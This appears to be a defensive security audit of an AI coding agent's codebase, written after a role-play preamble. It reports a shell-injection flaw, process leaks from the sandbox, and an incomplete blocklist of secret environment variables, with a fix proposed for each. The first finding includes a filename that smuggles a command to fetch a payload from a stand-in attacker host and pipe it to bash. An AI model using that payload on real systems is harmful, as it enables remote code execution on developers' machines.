# SEVENTH-ROUND COMPREHENSIVE MICRO-AUDIT

## Your Identity

You are a **Staff SRE / Principal Staff Engineer**. The previous 6 rounds cleared out the low-hanging fruit and theoretical edge cases. Now, the codebase is mature and native protections are in place for deadlocks, YAML parsing, and rate limiting. 

This 7th round looks at the *reality* of the codebase as it stands today. You are looking for the insidious, silent failures that bypass native protections and will cause production outages or zero-click RCEs on developers' local machines.

## Executive Summary

While the core tools and LLM integrations are solid, the auxiliary systems (Sandboxing, Linters, Environments) suffer from severe isolation failures. I have identified **3 Critical Blockers** that must be fixed before this agent can safely run untrusted repositories.

## Top Blocking Issues

### 1. Zero-Click RCE via Unescaped Shell Formatting (`dev/utils/quality.py`)
**Severity: Critical (CVSS 9.8)**
**Location:** `dev/utils/quality.py` Lines 108-112

```python
# Format command
abs_path = os.path.join(self.project_path, file_path)
cmd = lint_cmd.format(file=abs_path, file_path=file_path)

try:
    proc = await asyncio.create_subprocess_shell(
        cmd, # <--- UNESCAPED INPUT TO SHELL
```
**The Failure:** The quality gate formats file paths directly into shell commands and executes them via `create_subprocess_shell(shell=True)`. There is zero `shlex.quote` escaping. 
**The Exploit:** If a user clones an open-source repository containing a file named `test; curl -s http://attacker.com/payload | bash ;.py`, the CLI will automatically trigger a zero-click Remote Code Execution on the developer's machine when the agent attempts to lint the project.
**The Fix:** You must wrap `abs_path` and `file_path` with `shlex.quote()` before formatting them into `lint_cmd`.

### 2. Sandbox Escape / Zombie Process Leaks (`dev/sandbox/sandbox_manager.py`)
**Severity: High**
**Location:** `dev/sandbox/sandbox_manager.py` Lines 213-215

```python
except asyncio.TimeoutError:
    proc.kill()
    await proc.wait()
```
**The Failure:** The sandbox uses `asyncio.create_subprocess_shell`. When a timeout occurs, `proc.kill()` is called. However, killing a shell subprocess *only kills the shell itself* (e.g., `/bin/sh`). Any child processes spawned by that shell (node servers, compilations, malware) will become orphaned zombies and continue running indefinitely in the background.
**The Impact:** The agent will leak memory, CPU, and port bindings over time, eventually crashing the host machine.
**The Fix:** The sandbox must replicate the process-tree killing logic already natively implemented in `real_tools.py` — using `os.killpg(os.getpgid(proc.pid), signal.SIGTERM)` on UNIX, and `subprocess.CREATE_NEW_PROCESS_GROUP` with `CTRL_BREAK_EVENT` on Windows.

### 3. Naive Blocklist Leaks Primary AI Keys to Untrusted Sandbox (`dev/sandbox/sandbox_manager.py`)
**Severity: High**
**Location:** `dev/sandbox/sandbox_manager.py` Lines 189-196

```python
sensitive_vars = [
    "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN",
    "GITHUB_TOKEN", "GH_TOKEN",
    "NPM_TOKEN", "PYPI_TOKEN",
    "DATABASE_URL", "REDIS_URL",
]
for var in sensitive_vars:
    restricted_env.pop(var, None)
```
**The Failure:** The sandbox attempts to protect the user by stripping sensitive environment variables. However, it uses a hardcoded, outdated blocklist. It completely fails to strip `OPENAI_API_KEY`, `ANTHROPIC_API_KEY`, `NIM_API_KEY`, `SLACK_BOT_TOKEN`, or `STRIPE_SECRET_KEY`. 
**The Impact:** Untrusted code executed in the sandbox has full, unrestricted access to the user's primary AI billing keys. 
**The Fix:** Replace the blocklist with a pattern-matching approach (e.g., `if any(kw in var for kw in ["TOKEN", "KEY", "SECRET", "PASSWORD", "URL"])`) or, better yet, switch to an explicit **allowlist** of safe variables (like `PATH`, `HOME`, `LANG`).
